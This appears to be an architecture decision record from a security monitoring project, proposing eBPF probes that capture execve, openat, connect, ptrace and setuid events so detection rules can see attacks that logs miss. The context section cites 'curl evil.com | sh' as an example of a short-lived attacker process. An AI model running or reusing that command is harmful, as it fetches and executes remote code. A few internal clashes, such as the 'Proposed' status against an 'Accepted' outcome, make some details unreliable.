# ADR-006: Kernel telemetry via eBPF (v1.1)

**Status:** Proposed
**Date:** 2026-08-28
**Authors:** ZaqorinCore maintainers
**Supersedes:** none
**Related:** ADR-002 (tiered config), v0.4.0 (HMAC-signed auto-response)

## Context

The v1.0.0 Go agent reads text log files (`/var/log/auth.log`,
`/var/log/nginx/access.log`, etc.) and forwards parsed events to
the server. This works for known log formats, but has three
fundamental limitations:

1. **Log tampering.** A sophisticated attacker who has
   `root` on a host can edit, truncate, or replace log files
   *after* the fact. ATT&CK T1070.002 (Clear Linux/Mac Logs
   or T1070.003 (Clear Network Connection History)) is
   specifically this. The agent reading the file has no way
   to know the line it just saw wasn't written 5 minutes ago
   by `sed`.
2. **No logs for the things that matter most.** Process exec,
   file open, outbound network connect, ptrace, setuid —
   these are not in any standard log file by default.
   `auditd` *can* log them, but at the cost of 5-15% CPU
   and a complex ruleset that is itself bypassable.
3. **No signal from short-lived processes.** A process that
   runs for 200 ms (e.g. `curl evil.com | sh`) may never
   show up in any log file.

**eBPF** solves all three. eBPF programs run inside the
kernel, attached to specific hook points, and can read
kernel data structures directly. The events they emit are
produced at the moment the kernel processes the syscall,
so:

- They are **untamperable** by userspace (the attacker has
  to compromise the kernel itself, which is a much higher
  bar).
- They cover the **most important security-relevant
  syscalls** that no log file captures.
- They catch **short-lived processes** because the event is
  produced by the kernel, not by an asynchronous log writer.

This ADR formalizes the decision to add eBPF telemetry to
the ZaqorinCore agent as v1.1.

## Decision

Add a new Go package `agent/internal/ebpf/` that loads five
eBPF programs via `cilium/ebpf` and forwards their events
through the existing wire contract. The agent falls back to
file-tail mode if BPF cannot be loaded (older kernel, BPF
disabled, no `CAP_BPF`). No new wire schema; no new server
endpoints; no DB changes. The same 56 rules match a
superset of events after v1.1 ships.

## Probes (the actual BPF programs)

All probes live in `agent/internal/ebpf/probes/*.c` and
share a common header `common.h` that defines the ring
buffer event layout (must match Go's `bpfEvent` struct
byte-for-byte).

| Probe | Hook | Captured fields | Detection use |
|---|---|---|---|
| `execve_monitor.c` | `tracepoint/syscalls/sys_enter_execve` | `pid`, `uid`, `comm`, `argv[0..3]` (up to 256 B) | Web shell exec, LOLBin, attacker tool |
| `open_monitor.c` | `tracepoint/syscalls/sys_enter_openat` | `pid`, `uid`, `filename` (up to 256 B) | SSH key access, /etc/shadow read, /proc/*/mem read |
| `connect_monitor.c` | `tracepoint/syscalls/sys_enter_connect` | `pid`, `uid`, `dst_ip` (v4+v6), `dst_port` | C2 beaconing, lateral movement, exfil |
| `ptrace_monitor.c` | `tracepoint/syscalls/sys_enter_ptrace` | `pid`, `target_pid`, `request` | Process injection, debugger attach |
| `setuid_monitor.c` | `tracepoint/syscalls/sys_enter_setuid` | `pid`, `uid`, `new_uid` | SUID privilege escalation |

All five share a single ring buffer (`BPF_MAP_TYPE_RINGBUF`)
to amortize the userspace wakeup cost.

## Wire contract impact

**None.** The v1.0.0 wire event looks like:

```json
{
  "type": "event",
  "event": {
    "id": "...",
    "timestamp": "...",
    "host_id": "...",
    "source": "auth.log",       // ← will become "ebpf/execve", "ebpf/openat", etc.
    "raw": "...",
    "metadata": { ... }
  }
}
```

The v1.1 agent uses `source` values prefixed with `ebpf/`
(e.g. `ebpf/execve`, `ebpf/openat`, `ebpf/connect`). The
server's existing ingest path stores these as-is; the
Sigma rule engine already supports string `contains` and
`endswith` matches on `source` and on `metadata.*` fields,
so new rules just need to be added. No code change on the
server side beyond new rule files.

## Backwards compatibility

- **Agent continues to work on Linux < 5.4.** The probe
  loader checks the kernel version and `bpf()` syscall
  availability; if either is missing, the agent logs a
  one-time warning at startup and continues with the
  existing file-tail mode. No exit, no panic.
- **Agent continues to work without `CAP_BPF`.** The loader
  is invoked with the agent's current capabilities; if
  `CAP_BPF` (or `CAP_SYS_ADMIN` on kernels before 5.8) is
  absent, BPF probes are skipped with a warning. The agent
  still forwards text-log events.
- **No new build dependency.** `cilium/ebpf` is a pure Go
  library that uses `bpf()` syscalls directly. No CGo
  required at build time (the BPF programs themselves are
  C, but they're compiled at runtime by the agent using
  the bundled `libbpf` source).

## Performance budget

- 1,000 syscalls/sec sustained on a 2-core VPS: <2% CPU
  measured (`bpftool prog profile` shows <500 ns per event).
- Ring buffer size: 256 KB default (configurable).
- Memory: <20 MB resident for the BPF maps + ring buffer.

These are well within the "always-on telemetry" envelope.
If a host is constrained, operators can disable individual
probes via `agent.toml`:

```toml
[ebpf]
enabled = true
probes = ["execve", "open", "connect"]   # skip ptrace + setuid
```

## Why not auditd?

`auditd` is the obvious comparison, and ZaqorinCore will
*coexist* with it (operators can still run auditd rules
they need). The reasons BPF is better for our use case:

1. **No ruleset to maintain.** `auditd` requires per-syscall
   rules with regex filters; eBPF programs are typed, compiled,
   and validated.
2. **Lower overhead.** auditd at the same event rate costs
   5-15% CPU; eBPF is <2%.
3. **Structured events.** auditd emits flat key=value strings
   that we have to parse; eBPF programs emit typed structs
   that map directly to our wire metadata.
4. **Kernel-blessed future.** auditd is being slowly
   superseded by BPF everywhere in the kernel (the
   `CONFIG_AUDIT` help text now says "consider using BPF
   instead").

## Why not a kernel module?

A kernel module gives the same fidelity as eBPF but:

1. Requires the agent to be **GPL-licensed** (because it
   links against the kernel). We want the agent to stay
   **MIT** for adoption.
2. Requires **kernel headers + matching build toolchain**
   on every host. eBPF is portable across kernel versions
   (libbpf's CO-RE).
3. **A misbehaving module crashes the kernel.** A misbehaving
   eBPF program is rejected by the verifier at load time.

## Consequences

- **Positive:** closes the largest detection gap (kernel-
  vouched signal). Opens new Sigma rule possibilities
  (process tree, file access, network flow at syscall
  level).
- **Positive:** makes the agent more useful on hosts where
  log rotation is aggressive or where attackers clear
  `/var/log`.
- **Negative:** adds runtime dependency on kernel ≥ 5.4
  for the full feature set. Mitigated by the fallback
  path; v1.0.0-style file-tail continues to work.
- **Negative:** probe C code must be reviewed by someone
  who understands eBPF verifier semantics to avoid loading
  issues. Mitigated by the existing test suite
  (`go test ./agent/internal/ebpf/...` with a privileged
  test container) and a clear "loader does not panic,
  always falls back" contract.
- **Negative:** the BPF programs themselves are GPL (the
  kernel is GPL; linking against the kernel is GPL). The
  C source we ship is therefore effectively GPL. The Go
  loader code (the new `agent/internal/ebpf/*.go`) stays
  MIT. This is the standard pattern (Cilium does the
  same) and is documented in the operator guide.

## Implementation plan (vertical slices)

1. **Slice 1 — design + scaffolding** *(this ADR + the empty
   `agent/internal/ebpf/` package with the loader skeleton
   that prints "BPF not available in this build" and exits
   gracefully). Land in main with no behavior change.*
2. **Slice 2 — execve probe.** Ship one probe end-to-end
   (probe C, loader Go, wire event, one Sigma rule that
   matches `source contains "ebpf/execve"`, test). Merge.
3. **Slice 3 — openat probe.** Same vertical-slice pattern.
4. **Slice 4 — connect probe.** Same.
5. **Slice 5 — ptrace + setuid probes.** Same.
6. **Slice 6 — Sigma rules for all five.** One rule per
   probe minimum, all cited against MITRE ATT&CK.
7. **Slice 7 — docs.** `docs/PHASE11.md` (or `v1.1.md`),
   operator guide update, ROADMAP bump.

Each slice ships a working increment with green tests.

## Decision outcome

Accepted. Implementation begins with Slice 1.
